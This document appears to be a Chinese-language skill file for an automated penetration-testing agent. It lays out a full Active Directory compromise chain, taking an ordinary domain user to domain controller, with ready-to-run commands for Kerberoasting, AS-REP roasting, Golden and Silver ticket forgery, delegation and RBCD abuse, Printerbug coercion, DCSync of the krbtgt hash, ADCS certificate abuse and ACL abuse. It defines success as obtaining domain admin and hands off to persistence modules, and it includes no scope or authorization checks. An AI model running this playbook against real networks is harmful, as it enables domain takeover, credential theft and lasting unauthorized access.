---
name: ad-domain-attack
description: AD 域渗透：BloodHound 路径分析、Kerberoasting/AS-REP roasting、委派攻击、DCSync、Golden/Silver 票据、ADCS 证书攻击（ESC1-8）
whenToUse: 已进内网且环境是 Windows 域；需要从普通域用户打到域控、需要 krbtgt 哈希、需要伪造票据、需要滥用证书服务
role: internal
enabled: true
---

# AD 域渗透（域用户 → 域控全链）

前提:任意一个域账号(哪怕最普通)。路径:信息收集 → Kerberos 攻击 → 委派/ACL 滥用 → DCSync/Golden。
**判定红线:DCSync 拉到 krbtgt 哈希、或以 DA 身份登域控成功**。

## 一、信息收集

```powershell
# 域内定位
nltest /dsgetdc:%USERDOMAIN%          # 域控定位
net group "domain admins" /domain     # DA 列表
GetADUsers.py -all -dc-ip <DC> <DOM>/<user>:<pass>   # impacket 全用户
```

### BloodHound(必跑)
```bash
# 采集(SharpHound,域内机器执行)
powershell -enc <SharpHound.ps1 -c All 的 b64>
# 或 python 版
bloodhound-python -u <user> -p <pass> -d <dom> -dc <DC> -c All --zip
```
- 分析目标:**最短攻击路径**:当前用户 → Domain Admins;关注 GenericAll/WriteDacl/ForceChangePassword/SQLAdmin/GPO 控制链
- 关键预置查询:Shortest Path to Domain Admins / Kerberoastable Users / AS-REP Roastable / Unconstrained Delegation

## 二、Kerberos 攻击(无凭据也能打)

### Kerberoasting(任何域用户可打 SPN 账户)
```bash
# impacket:拉 TGS 并破解
GetUserSPNs.py -request -dc-ip <DC> <DOM>/<user>:<pass> -outputfile spn.hash
hashcat -m 13100 spn.hash rockyou.txt        # TGS-REP(RC4)
hashcat -m 19700 spn.hash rockyou.txt        # AES
```
- 优先目标:sqlsvc/backup/mimikatz 等服务账户(密码强度通常烂)

### AS-REP Roasting(未设预认证的账户,连凭据都不要)
```bash
GetNPUsers.py <DOM>/ -usersfile users.txt -format hashcat -dc-ip <DC>
hashcat -m 18200 asrep.hash rockyou.txt
```

### 票据伪造(拿到 krbtgt/service 哈希后)
```bash
# Golden(需 krbtgt hash)
ticketer.py -domain <DOM> -nthash <krbtgt_ntlm> -domain-sid <SID> -spn <SPN> fakeadmin
# Silver(只需服务账户 hash,可打特定服务)
ticketer.py -domain <DOM> -nthash <svc_ntlm> -domain-sid <SID> -spn cifs/dc01.<dom> fakeadmin
export KRB5CCNAME=fakeadmin.ccache && psexec.py <DOM>/fakeadmin@dc01 -k -no-pass
```

## 三、委派攻击

### 非约束委派(找到后直接抓 DA 票据)
```bash
# BloodHound 找 Unconstrained Delegation 的机器 → 在该机器上跑 Rubeus 等票据
Rubeus.exe monitor /interval:5 /nowrap        # 等 DA 登录(可配合 Printerbug 触发)
# Printerbug 强制 DC 来认证
python printerbug.py <DOM>/<user>:<pass>@<委派机IP> <回连IP>
```
### 约束委派(S4U2Self+S4U2Proxy)
```bash
# 找到 allowedToDelegateTo 的账户
getST.py -spn cifs/dc01.<dom> -impersonate administrator <DOM>/<svc_user>:<pass>
export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass <DOM>/administrator@dc01
```
### 基于资源的约束委派(RBCD,需要 GenericWrite)
```bash
# 给目标机器加机器账户并配 RBCD
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' <DOM>/<user>:<pass>
rbcd.py -delegate-to TARGET$ -delegate-from EVIL$ -action write <DOM>/<user>:<pass>
getST.py -spn cifs/target.<dom> -impersonate administrator <DOM>/'EVIL$':'P@ss'
```

## 四、DCSync(拿 krbtgt,域渗透终点站)

```bash
# 需要复制目录权限(DA/管理员组/或被滥用的复制权账户)
secretsdump.py -just-dc-user krbtgt <DOM>/<admin>:<pass>@<DC>
secretsdump.py -just-dc <DOM>/<admin>:<pass>@<DC>      # 全量
```
- 拿到 krbtgt → Golden 永久(除非两次改密)
- **ADCS 域提权路径**:certipy 攻 ESC1(可编辑模板):
  ```bash
  certipy find -u <user>@<dom> -p <pass> -vulnerable      # 找脆弱模板
  certipy req -u <user>@<dom> -p <pass> -ca CORP-CA -template VulnTemplate
  certipy auth -pfx user.pfx                              # 用证书拿 DA(pass-the-cert)
  ```

## 五、ACL 滥用速查
- GenericAll(用户):改密码 `Set-DomainUserPassword` → 登录
- GenericAll(组):把自己加进组
- WriteDACL:给自己 GenericAll
- ForceChangePassword:改目标密码(包括 DA 账户的间接路径)
- GPO 控制权:新 GPO 挂立即计划任务(SCT/GPO 的滥用属于 c2-persistence)

## 红线(完成判定)
- DCSync 拿到 krbtgt NTLM(secretsdump 输出 KRBTGT 行)
- 或 pass-the-ticket 后 psexec 登域控 `whoami` = 域管
- 全程票据文件(KRB5CCNAME / .kirbi)留档到 runs/

## 衔接
- 破解出的凭据 → credential-attack 的字典沉淀
- 域控权限 → c2-persistence(固化)
- 委派前置信息 → fscan-intranet / gogo-intranet 已出的服务清单
